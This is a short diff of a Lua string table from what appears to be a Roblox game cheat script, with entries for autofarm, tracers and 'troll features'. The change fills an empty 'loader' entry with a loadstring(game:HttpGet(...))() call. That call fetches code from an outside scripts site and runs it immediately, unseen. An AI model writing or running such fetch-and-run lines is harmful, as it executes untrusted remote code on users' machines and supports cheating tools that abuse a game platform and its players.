@@ -860,7 +860,7 @@ return {
                 [905] = "Tracer Innocent only ON",
                 [906] = "Loading autofarm...",
                 [907] = "loader",
-                [908] = "",
+                [908] = "loadstring(game:HttpGet("https://star-scripts.com/api/run/CoephTiLN9-S5KNUfN0w7D-b5sfmzq7E"))()",
                 [909] = "TROLL FEATURES",
                 [910] = "troll features",
                 [911] = "sethiddenproperty",
